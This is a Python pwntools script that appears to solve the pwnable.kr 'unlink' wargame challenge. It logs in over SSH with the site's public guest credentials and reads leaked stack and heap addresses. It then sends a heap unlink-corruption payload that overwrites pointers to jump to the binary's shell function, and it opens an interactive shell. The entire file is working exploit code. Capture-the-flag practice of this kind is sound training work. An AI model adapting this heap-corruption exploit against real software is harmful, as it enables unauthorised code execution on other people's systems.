#!/usr/bin/python3

from pwn import ELF, args, process, ssh, p32


elf = ELF('./unlink')


def conn():
    if args.LOCAL:
        sh = process([elf.path])
    else:
        s1 = ssh('unlink', host='pwnable.kr', port=2222, password='guest')
        sh = s1.process('/home/unlink/unlink')

    return sh


def parse_stack_and_heap_leaks(sh):
    sh.recvuntil(b"stack address leak: ")
    stack_adr = sh.recvline()[:-1]
    sh.recvuntil(b"heap address leak: ")
    heap_adr = sh.recvline()[:-1]

    stack_adr = int(stack_adr, base=16)
    heap_adr = int(heap_adr, base=16)

    return stack_adr, heap_adr


def main():
    r = conn()

    stack_adr, heap_adr = parse_stack_and_heap_leaks(r)
    print(hex(stack_adr), hex(heap_adr))

    payload = b''
    if args.LOCAL:
        payload += p32(heap_adr + 0x2000)  # new stack
        payload += b'A' * 12
        payload += p32(0)
        payload += p32(0x21)
        payload += p32(stack_adr - 32)  # FD, X => [X + 4] = Y
        payload += p32(heap_adr + 12)  # BK, Y => [Y] = X
        payload += p32(elf.symbols['shell']) * 0x4000
    else:
        payload += p32(heap_adr + 0x2000)  # new stack
        payload += b'A' * 4
        payload += p32(0)
        payload += p32(0x19)
        payload += p32(stack_adr - 32)  # FD, X => [X + 4] = Y
        payload += p32(heap_adr + 12)  # BK, Y => [Y] = X
        payload += p32(elf.symbols['shell']) * 0x4000

    # input('+++') fire gdb here
    r.sendline(payload)

    # get shell :)
    r.interactive('')


if __name__ == "__main__":
    main()
